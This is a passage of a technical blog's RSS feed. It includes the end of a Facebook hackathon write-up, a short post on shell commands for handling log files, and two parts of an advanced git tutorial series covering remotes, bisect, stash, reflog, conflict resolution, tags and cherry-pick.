<p>2 wheels, foot power and long distance travelling made easy! These two guys are achieving the awesome tool that brings bikers a dream app come true! Using complex algorithms, they want to give bikers many possible routes from one place to another. You can choose your own type of road, either abrupt and short or longer and less steep. The point? You can choose which kind of road you want and which is fit for you! If that is not enough, these 2 guys are doing this client side with ClojureScript… yeah, it’s the new functional kid in town which tries to solve the event driven callback hell. <a href="https://github.com/rosedu/flatride">FlatRide</a> on, people!</p>
<div class="center">
<img width="600" height="400" src="/images/facebook-hackathon/flatride.jpg">
</div>
<div class="right">
<img src="/images/facebook-hackathon/jackson.jpg">
</div>
</section>
<section id="jackson-gabbard" class="level4">
<h4><a href="https://www.facebook.com/jg">Jackson Gabbard</a></h4>
<p>From an English major in Tennessee, to the 300th Facebook employee, to the 4th one to move in the new London office. He works on developer tools for the engineers and oversees some of the most important components like <em>Tasks</em> which devs open daily to get their job done. He is a self-taught hacker and he had an enlightment moment about the power of programming the first time he used the array structure.</p>
<p>He was really communicative and willing to tell us of his opinions, about the event, mentioning that he’s amazed about the main focus of students. ‘Transportation’, ‘Finding things’ and ‘Group organization’ are recurrent themes. He said some of his coworkers are Romanian and he thinks Romania is a land where lots of engineers are being created. Proud to be a full-time hackers around here!</p>
<p>We also asked him about the Bootcamp in London, which is about learning to code. And guess what? Even executives go through these preparations to get into Facebook. The engineering team has lots of fun hacking in that period of education. It teaches you how to love the company, you get to learn the ropes while communicating and interact with other mind-like people.</p>
<p>Finally he has participated in lockdowns each year. These are periods of time when teams gather in a room and stay there for several days (usually 30) and ship a big feature. Pretty hardcore, but that’s life at Facebook.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Sat, 19 Oct 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/facebook-hackathon-live-blogging.html</guid>
</item>
<item>
    <title>Shell tips and tricks for log files</title>
    <link>http://techblog.rosedu.org/shell-tips-and-tricks-for-file-editing.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/shell-tips-and-tricks-for-file-editing.html" title="Shell tips and tricks for log files">Shell tips and tricks for log files</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on June 20, 2013</span>
      by
      <span class="author">Alexandru Juncu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/CLI.html">CLI</a>, <a href="/tags/bash.html">bash</a>, <a href="/tags/shell.html">shell</a>, <a href="/tags/files.html">files</a>, <a href="/tags/text.html">text</a>, <a href="/tags/truncate.html">truncate</a>, <a href="/tags/tee.html">tee</a>, <a href="/tags/tail.html">tail</a>, <a href="/tags/follow.html">follow</a></span>
      </span>

      <p>Here are are some small things you might find useful when you need to deal with text files. In the Linux/Unix world, a lot of things are text files, so you need to know how to efficiently handle them. If you are a sysadmin, you need to look at <strong>log files</strong> for most of your work time and the following might come in handy.</p>
<section id="following-a-log-file" class="level3">
<h3>Following a log file</h3>
<p>Take your <code>$GENERIC_SERVICE</code> on your server that generates a lot of logs. You could open a <strong>text editor</strong> like <code>vi</code> or <code>emacs</code> to view the logs or use <code>tail</code> to see the latest lines (or a combination of tail and <code>head</code>). But you sometimes you need to view contents of the log in real time (while the service writes the lines, you read them). This is where the best use for the tail command comes in: the <code>--follow</code> flag.</p>
<pre><code>tail -f /var/log/mylog</code></pre>
<p>Tail usually creates a process that prints a few lines (the lines that exist when you run it), but with the <code>-f</code> flag, the tail process keeps running and prints new lines as the file is being appended. The process will close when the uses issues the <code>Cltr-D</code> (end of file) command.</p>
</section>
<section id="truncating-a-file" class="level3">
<h3>Truncating a file</h3>
<p>Maybe you need to clear the contents of a log file that has gotten too big. You could do a <code>rm</code> on the file and let the service write the new logs in a new file. Some services are picky and need the file to already exist, so you could use the <code>touch</code> command (that “updates” an existing file) which has the interesting side effect when applied on a non existing file: to create an empty file (a new inode with no data blocks).</p>
<p>But you just want to empty a file (same inode, just the contents cleared). You could use the <code>truncate</code> command with the size flag of 0 bytes (<code>-s 0</code>). Or make use of the redirect operator <code>&gt;</code>.</p>
<pre><code>:&gt;file</code></pre>
<p>or just</p>
<pre><code>&gt;file</code></pre>
<p>These will open the file, and redirect nothing into it. Since it is not appending anything, the contents will be erased. <code>:</code> is the no-op command so nothing will actually be done, but the shell with open and write (well … nothing) into the file because of the redirection operator <code>&gt;</code>.</p>
</section>
<section id="one-input-two-outputs" class="level3">
<h3>One input, two outputs</h3>
<p>Some programs do not have a logging system programmed into them and just print messages to standard output. Maybe you want to save that output into a file for future use. This is simple to do with a file redirection:</p>
<pre><code>./myprogram &gt; my_log_file</code></pre>
<p>But if you do this, you will lose the output to the (virtual) terminal. A very interesting command is <code>tee</code>, that takes an input and writes to standard output, but also writes into a specified file. You need to pipe the output of a process into tee like this:</p>
<pre><code>./myprogram | tee my_log_file</code></pre>
<p>Now you have both real time printing of the messages and you have them saved for future use.</p>
<p>Hope this helps!</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Thu, 20 Jun 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/shell-tips-and-tricks-for-file-editing.html</guid>
</item>
<item>
    <title>Git Is The Answer 3/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-3.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-3.html" title="Git Is The Answer 3/3">Git Is The Answer 3/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 26, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>Finally, the third article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics will focus on things that many will use only in some very special cases.</p>
<section id="handling-multiple-remotes" class="level2">
<h2>Handling Multiple Remotes</h2>
<p>There are situations when you decide to use multiple remotes for a repository. For example, I’m using multiple remotes for my snippets repository:</p>
<pre><code>razvan@einherjar:~/code$ git remote show
gh
gl
glcs
origin

razvan@einherjar:~/code$ cat .git/config
[remote &quot;origin&quot;]
    fetch = +refs/heads/*:refs/remotes/origin/*
    url = razvan@swarm.cs.pub.ro:git-repos/code.git
[remote &quot;gh&quot;]
    url = git@github.com:razvand/snippets.git
    fetch = +refs/heads/*:refs/remotes/gh/*
[remote &quot;gl&quot;]
    url = git@gitlab.com:razvand/mine.git
    fetch = +refs/heads/*:refs/remotes/gl/*
[remote &quot;glcs&quot;]
    url = git@gitlab.cs.pub.ro:razvan.deaconescu/code.git
    fetch = +refs/heads/*:refs/remotes/glcs/*</code></pre>
<p>One particular situation when multiple remotes are required is when using a fork of a GitHub repository and doing <a href="https://help.github.com/articles/using-pull-requests" title="Using Pull Requests">pull requests</a>. This is also mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>After you create a repository fork on GitHub, you clone that fork. For example, I’ve forked the <a href="https://github.com/rosedu/site">ROSEdu site repository</a> in <a href="https://github.com/razvand/site">my forked repository</a>. I’ve cloned <a href="https://github.com/razvand/site">the forked repository</a>, worked on the local clone and then pushed changes. I would then create a pull request with those changes, that that they would be integrated in <a href="https://github.com/rosedu/site">the main repository</a>.</p>
<p>A problem arises when the fork is not synced with the main repository. Ideally, there would be a GitHub option to sync the fork. Since that doesn’t exist, the fork needs to be updated manually, though the local copy, as mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>First of all, you need to add the main repository as another remote to the local repository. This is a read-only remote. As suggested by GitHub, I’ve named this new remote <code>upstream</code>:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show
origin
upstream
razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show upstream
* remote upstream
  Fetch URL: git@github.com:rosedu/site.git
[...]</code></pre>
<p>In order to sync the local repository with the <code>upstream</code> remote (<a href="https://github.com/rosedu/site">the main repository</a>) just fetch and rebase changes:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git fetch upstream
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 11 (delta 6), reused 9 (delta 4)
Unpacking objects: 100% (11/11), done.
From github.com:rosedu/site
   d21f23f..7411020  master     -&gt; upstream/master
razvan@einherjar:~/projects/rosedu/site/site.git$ git rebase upstream/master
First, rewinding head to replay your work on top of it...
Fast-forwarded master to upstream/master.</code></pre>
<p>This changes are then pushed to the <code>origin</code> remote (<a href="https://github.com/razvand/site">the forked repository</a>):</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git push origin master
Counting objects: 16, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (11/11), done.
Writing objects: 100% (11/11), 1.99 KiB, done.
Total 11 (delta 6), reused 0 (delta 0)
To git@github.com:razvand/site.git
   6f3dd4d..7411020  master -&gt; master</code></pre>
<p>New local changes are then going to be pushed to the <code>origin</code> remote. These changes are then going to be aggregated into pull requests for the <code>upstream</code> remote (the main repository), now in sync with the forked repository.</p>
<p>The above is a specific use case for syncing a fork in GitHub, making use of two remotes: one for the original reposotiry and one for the fork. The <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">excellent GitHub article</a> thoroughly describes the steps you need to undertake to sync your fork.</p>
</section>
<section id="bisecting-the-history" class="level2">
<h2>Bisecting the History</h2>
<p>A powerful feature of Git is its ability to quickly find out a commit which introduced a bad change. Suppose you have a bug in your application:</p>
<pre><code>$ ./test_math.py 
2 + 3 = 6</code></pre>
<p>Usually, it is possible that the bug was introduced several commits backwards in time and it is harder to solve by debugging. Git comes to help with <code>git bisect</code>. First, start, the process with <code>git bisect start</code> and mark a good and a bad commit (the boundaries of the bisect range).</p>
<pre><code>$ git bisect start
$ git bisect good 368297b26ac1f0dc4
$ git bisect bad
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Git has found a commit in the middle of the range. You test your code again and see if the problem is solved or not. Then pass <code>good</code> or <code>bad</code> to <code>git bisect</code></p>
<pre><code>$ ./test_math.py
2 + 3 = 5
$ git bisect good
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).</code></pre>
<p>Continue this process until there are no more commits left in range.</p>
<pre><code>$ git bisect good 
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).</code></pre>
<p>Git even shows you the commit and it’s message. Now, do a simple <code>git show</code> to see the changeset of the bad commit:</p>
<pre><code>$ git show 1c6fddb664ce6cb7bb
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

diff --git a/test_math.py b/test_math.py
index a6624f7..6e7f061 100755
--- a/test_math.py
+++ b/test_math.py
@@ -4,7 +4,7 @@ def custom_sum(*args):
     &quot;&quot;&quot;Calculate the sum of two given numbers.
        Make the sum work for multiple arguments
     &quot;&quot;&quot;
-    crt = 0
+    crt = 1
     for var in args:
         crt += var
     return crt</code></pre>
<p>In the end, you do a <code>git bisect reset</code> to return to the starting point. Do the fix, commit and continue contributing to the project.</p>
<p>Finally, you can use <code>git bisect</code> with automated tests. Start the bisection with <code>git bisect start</code> but pass the two end-points as well</p>
<pre><code>$ git bisect start HEAD 368297b26ac1f0dc4
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Then use <code>git bisect run</code> with a script which returns 0 if the code is ok or anything else if the bug is still present. Git will do the bisection for you.</p>
<pre><code>[mihai@esgaroth repo3]$ git bisect run ./test.sh
running ./test.sh
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).
running ./test.sh
Bisecting: 1 revision left to test after this (roughly 1 step)
[d8a251d8348ac236d344a00b50a987e2af726663] Modify test_math.py (2).
running ./test.sh
Bisecting: 0 revisions left to test after this (roughly 0 steps)
[2a084b613f6b69cc8eb44648b8b5665402f5d9c0] Modify test_math.py (3).
running ./test.sh
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

bisect run success</code></pre>
<p>This is indeed a good tool to have in Git’s toolbox.</p>
</section>
<section id="stashing-the-goodies" class="level2">
<h2>Stashing the Goodies</h2>
<p>It often happens that you’ve done some changes that you don’t want to commit yet but you need to sync with the remote repository (i.e. do a pull). Or you want to merge a branch without commiting your changes. In this case, the solution is using the stash.</p>
<p>The stash is a special place for Git where you temporarily stash your changes in order to keep your repository clean:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash
Saved working directory and index state WIP on master: 7411020 Remove a stupid Maruku error.
HEAD is now at 7411020 Remove a stupid Maruku error.
razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
nothing to commit (working directory clean)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash pop
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
Dropped refs/stash@{0} (940f594b5f93e616dc16285e0677fbc78aa33620)</code></pre>
<p>The moment you stash changes, they “disappear” from the working directory. You will be able to get them by using <code>git stash pop</code>.</p>
<p>When multiple users are working on a given repository it will often happen that you need to pull their updates to see what has been done. Your local copy may have changes you’ve made yourself, but still far from a commit. In that case you would stash your changes, pull remote updates to sync your repository and then pop the stash to continue your work.</p>
</section>
<section id="a-reference-for-everything" class="level2">
<h2>A Reference For Everything</h2>
<p>We are near the end of the series. You have learned several things and you might try others as well. Yet, from time to time you may find out that you have lost a commit while playing around. Or, you rebased somewhere in the past but you need a commit which you had skipped. Or, you used <code>git reset --hard</code> and threw out a needed commit.</p>
<p>Luckily for you, Git doesn’t lose anything. Everything can be recovered by using a nice feature called <em>reflog</em> (from <em>reference log</em>). Let’s see it in action first.</p>
<pre><code>$ git reflog
096bec6 HEAD@{0}: commit: Add suggestion from Stefan Bucur.
8647ca7 HEAD@{1}: rebase finished: returning to refs/heads/master
8647ca7 HEAD@{2}: checkout: moving from master to 8647ca7c213ef26fe3426e079356a8b9c0ef1a8f^0
f020807 HEAD@{3}: commit: Ready to publish «Git is the answer - part 2» article.
274c7bc HEAD@{4}: rebase finished: returning to refs/heads/master
274c7bc HEAD@{5}: checkout: moving from master to 274c7bcc89487e3b3e5f935694046caf17bf005f^0
97b6f11 HEAD@{6}: commit: Add TODO for conclusions.</code></pre>
<p>The first column lists the commit hash at the point where the reference points to. The second is the state of <code>HEAD</code> (<code>HEAD{1}</code> is where <code>HEAD</code> previously was and so on). Then, you have a short description of what the reference is about (a commit, a checkout, a merge, a reset, etc.). This helps you in remembering what each change was about.</p>
<p>To recover a commit you just cherry pick it from the reflog using its hash or even the <code>HEAD@{id}</code> reference.</p>
</section>
<section id="garbage-collecting-the-repository" class="level2">
<h2>Garbage Collecting the Repository</h2>
<p>In the end, let’s focus on trimming down the disk usage of the repository. We want to prune some references. First, we set an expire date:</p>
<pre><code>$ git reflog expire --expire=1.day refs/head/master</code></pre>
<p>The above marks all references older than 1 day as being obsolete.</p>
<p>The second step is to find all unreachable objects:</p>
<pre><code>$ git fsck --unreachable
Checking object directories: 100% (256/256), done.
Checking objects: 100% (80/80), done.
unreachable blob 0aa0869906576afbe970251418982a5ae1a21698
unreachable blob c1b86d806044ba5e344e037ec0128f7e944d0e0f
unreachable blob 1f4998496071654c1b16eb33932d9d8b4fee5971
unreachable tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
unreachable blob d9024465bff70288deaa116a646c01f1af7170b6
unreachable blob ec1a48a4de254e80e803b4a4daa4a1f87fe4acea
unreachable blob f0c2af9359d0c360fae9779f8c8b3143e7002810
unreachable blob 17135e0a43db16a2d127a4cb2a692b41257c8c26
unreachable tree 39d3a7c06c75d063cc13adde71b745f412a6f84f
unreachable tree fad372db5c9c9b842d3786733437c5e32dda426b
unreachable blob 07c469400c9ed887416d16a178a28cb911e6634e
unreachable tree 8c1deacee70bb3329ae6cd4fa2fbf546395ea712
unreachable blob ad85a1ec621c5b58fd6876c4d88982406bd48156
unreachable tree c865c8cb1344f77363c5314a91344623fe0dd661
unreachable blob cdd55939c346385b7938f392f958812b4fa5ddaf
unreachable blob d8255f99d74b09435a70ad3f2b23b0e69babc818
unreachable blob f7ddf120540a448c50baba1047230e9ad7d687ac
unreachable tree 30ce2c01c2792fdc4dfa6ab5c3e0c1cb876a405a
unreachable blob 09cf62d09bb027f7cfabcb0333c1837fda3c9c92
unreachable blob 435716d9434a852229aee58d16104c3335684113
unreachable blob 974f61a4933ee5608b1810e569593adf2ffedd0b
unreachable tree b3df14961958afa1b0434c1a31065751fef3b30d</code></pre>
<p>Finally, we prune everything and then garbage collect the repository.</p>
<pre><code>$ git prune
$ git gc
Counting objects: 652, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (637/637), done.
Writing objects: 100% (652/652), done.
Total 652 (delta 373), reused 64 (delta 10)</code></pre>
<p>We can check the reduction in size by issuing a <code>du .</code> before and after the process. For this repository, we’ve managed to squeeze 3MB of space, not quite an impressive feat. However, for rapidly changing projects the gains should be higher.</p>
<p>In the end, looking at reflog we see</p>
<pre><code>$ git reflog --all
16a82d6 refs/remotes/gh/master@{0}: update by push
d3f979f refs/remotes/gh/master@{1}: update by push
454935e refs/remotes/gh/master@{2}: pull --rebase: fast-forward
bae10c0 refs/remotes/gh/master@{3}: update by push
c0a692b refs/remotes/gh/master@{4}: pull --rebase: fast-forward
04c5a1b refs/remotes/gh/master@{5}: pull --rebase: fast-forward
745963b refs/remotes/gh/master@{6}: pull --rebase: fast-forward
fd23db9</code></pre>
<p>The last line shows the id of one commit but nothing more related to it. You can still reset/rebase to there but you cannot point to any reference past it.</p>
</section>
<section id="closing-up" class="level2">
<h2>Closing Up</h2>
<p>We are at the close of this three part article on advanced git usage. Some of the things presented here might make you ask <em>when I’ll be using that?</em>. Some of them will prove useful from time to time while others are a good thing to know.</p>
<p>In the end, remember that Git is a swiss army knife among VCSs and there are a lot of features which will make us masters of it should we learn and practice using them. Like Vim, above a certain threshold Git can only be learnt by using it on a day to day basis.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 26 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-3.html</guid>
</item>
<item>
    <title>Git Is The Answer 2/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-2.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-2.html" title="Git Is The Answer 2/3">Git Is The Answer 2/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 22, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>The second article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics is focused on cases where multiple branches are involved.</p>
<section id="my-changes-conflict-with-yours" class="level2">
<h2>My Changes Conflict With Yours</h2>
<p>Usually, it happens that two developers are working on the same file. Git tries its best to merge changesets from both developers without complaining. However, Git is not a human being so it cannot know what change is the good ones when two changes happen two close to one another in the file.</p>
<p>As opposed to SVN, in Git, it is the responsibility of the one who pulls to solve conflicts. Thus, you are forced to solve conflicts before being able to push your changes upstream. But how does it work?</p>
<p>When you try to pull a file which contains conflicting changes, git will stop with a strange message. We will use the <code>git pull --rebase</code> command instead of the <code>git pull</code>.</p>
<pre><code>Using index info to reconstruct a base tree...
M   numbers
Falling back to patching base and 3-way merge...
Auto-merging numbers
CONFLICT (content): Merge conflict in numbers
Failed to merge in the changes.
Patch failed at 0001 Add a don&#39;t like line.
The copy of the patch that failed is found in:
   /tmp/repos/repo3/.git/rebase-apply/patch

When you have resolved this problem, run &quot;git rebase --continue&quot;.
If you prefer to skip this patch, run &quot;git rebase --skip&quot; instead.
To check out the original branch and stop rebasing, run &quot;git rebase --abort&quot;.</code></pre>
<p>Even the file you changed looks awkward:</p>
<pre><code>4
&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
insert here 5
=======
I don&#39;t like this line 5
&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add a don&#39;t like line.
6</code></pre>
<p>As you can see, there are 3 more lines inserted. The ones starting with <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code> and <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> mark the boundary of the conflicting area as well as the origin of the two conflicting changes (in our case <code>HEAD</code> is our repository’s latest commit while <code>Add a don't like line.</code> is the commit message of the last commit on the remote).</p>
<p>Between the two marks, you have the two changes, separated by <code>=======</code>. You, as a developer, have to choose what makes sense: either keep only one of the changes, merge them together or even write something totally new.</p>
<p>You edit the file with the desired change and add it back for staging. After this you simply continue the rebase process.</p>
<pre><code>git add numbers
git rebase --continue</code></pre>
<p>If there are more conflicting changes you will have to reapply the same procedure. Otherwise, you can go forward to pushing your changes. As you can see, no conflict ever leaves your repository, you are forced to deal with it before continuing.</p>
<p><strong>Note</strong>: Remember to solve all conflicts in the same file before continuing the rebase process. Otherwise artifacts will be committed. (this is an edit suggested via comments by Stefan Bucur).</p>
</section>
<section id="tags-and-branches-for-the-win" class="level2">
<h2>Tags and Branches For The Win</h2>
<p>Tags are the best way to keep references to old commits. They are particularly helpful in school related activities, where you update lectures and lab tasks on an yearly basis.</p>
<p>The right way to handle this is to create a tag at the end of each year and update labs and tasks. If at any time you want to check out the old curriculum you can get back to that tag.</p>
<p>For example, for the <a href="http://elf.cs.pub.ro/saisp/" title="SAISP">SAISP</a> repository, we’ve created tag a tag at the end of each year of study:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git tag
2009-2010
2010-2011
2011-2012</code></pre>
<p>If we would like to go to an old version we would simply create a branch starting from that tag:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git checkout -b br-2010-2011 2010-2011
Switched to a new branch &#39;br-2010-2011&#39;
razvan@einherjar:~/school/current/saisp/repo$ git status
# On branch br-2010-2011
nothing to commit (working directory clean)</code></pre>
<p>This allows easy organization of your tree, with no need to create other folders (one for each year). If you want to access information for a given year, you would just create a new branch.</p>
<p>This isn’t the case for the current <a href="https://github.com/rosedu/cdl" title="CDL repository">CDL repository</a>. I’m not particularly happy with it and will probably update it soon. As we weren’t very Git aware at the time we’ve created the repository, we started using a folder for each year:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util</code></pre>
<p>This is unnecessary and results in duplicate information, copied from one year to the other.</p>
<p>The solution is pretty simple: identify the last commit for each CDL session/year, tag it and then, if required create branches out of it.</p>
<p>Identifying the last commit for each CDL session is easily done through <code>gitk</code>. Browse the commits, look at the dates, identify the last commit and create a tag:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2009 e9858a9e74
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2010 26cd285f47
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-spring eaa2d7e9a8
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-fall f69e679ebd
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2012 fd23db9181</code></pre>
<p>Afterwards, we can create branches for each of them to easily go to that point:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2012 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-fall 2011-fall
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-spring 2011-spring
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2010 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2009 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch
  br-2009
  br-2010
  br-2011-fall
  br-2011-spring
  br-2012
* master
  old-master
  razvan</code></pre>
<p>Of course, it would only makes sense to really clear the repository and turn it into a “normal” one that only stores current information. Remove old year data and show only current one:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2011
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git mv 2013/* .
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ rmdir 2013
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
Makefile  curs1  curs3  git.mm  git_tutorial  schelet_inscriere  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git commit -m &#39;Clear folder structure. Leave only current items&#39;</code></pre>
<p>All is now nice and clear. Any updates are going to be done on the current folder structure; any request to see old data can be handled by checking out one of the branches.</p>
</section>
<section id="branches-on-a-virtual-machine" class="level2">
<h2>Branches on a Virtual Machine</h2>
<p>In our experience we come to situations when required to work on the desktop/laptop and on a virtual machine. Of course, we are using Git for storing code. It would only make sense for one repository to be a remote for another one. The case is that, with Git, every repository can be a remote.</p>
<p>As such, I usually create a clone of the laptop repository on the virtual machine. I usually do that with the <a href="http://ocw.cs.pub.ro/courses/so2/" title="SO2">SO2</a> repository when updating lab tasks or assignment solutions and tests. The laptop stores the main repository and the virtual machine uses a clone of that:</p>
<pre><code>root@spook:~# git clone razvan@einherjar.local:school/current/so2/git-repos/lab lab.git
root@spook:~# cd lab.git/
root@spook:~/lab.git# git remote show origin
* remote origin
  Fetch URL: razvan@einherjar.local:school/current/so2/git-repos/lab
  Push  URL: razvan@einherjar.local:school/current/so2/git-repos/lab
[...]</code></pre>
<p>In order to work properly on the remote you would need to use a dedicated branch to push information. You’ll have problems if you push to the master branch of a repository that is using the master branch itself. I usually dub this ‘vm’ (for virtual machine):</p>
<pre><code>root@spook:~/lab.git# git checkout -b vm
Switched to a new branch &#39;vm&#39;</code></pre>
<p>Any further changes are going to be committed in the ‘vm’ branch. Subsequently you would push these commits to the main repository, on the laptop:</p>
<pre><code>root@spook:~/lab.git# git push origin vm
Total 0 (delta 0), reused 0 (delta 0)
To razvan@einherjar.local:school/current/so2/git-repos/lab
 * [new branch]      vm -&gt; vm</code></pre>
<p>On the main repository, you would just merge or rebase your changes from that branch:</p>
<pre><code>razvan@einherjar:~/school/current/so2/git-repos/teme$ git rebase vm
First, rewinding head to replay your work on top of it...
Fast-forwarded master to vm.</code></pre>
<p>At this moment, all changes in the repository clone on the virtual machine are present in the master branch on the repository on the laptop. You need to create a separate branch on the virtual machine clone and then push that branch to the main repository. If you would work on the master branch on the virtual machine clone and push that, it would be problematic to integrate those changes in the master branch on the main repository.</p>
</section>
<section id="going-after-cherries" class="level2">
<h2>Going After Cherries</h2>
<p>In some cases, when working with multiple branches, it might happen that you need a specific commit from one branch but you don’t want to merge that branch into your current one.</p>
<p>Fortunately, Git allows you to pick a single commit as easy as picking cherries from a cherry-tree. In fact, the command is <code>git cherry-pick</code>.</p>
<pre><code>$ git cherry-pick 1904c3d4c9720
[master 3a30153] File to be cherry-picked in master.
 Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 file_to_get_in_master</code></pre>
<p>Now, you have a <strong>new</strong> commit with the same change as the picked-up commit but on your branch</p>
<pre><code>$ git log
commit 3a3015378c3c1b43c4895a00829034d53fb9a5b5
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Fri Mar 8 23:59:07 2013 +0200

    File to be cherry-picked in master.</code></pre>
<p>As you can see, the commit hash is different meaning that there is a new commit, not the old one.</p>
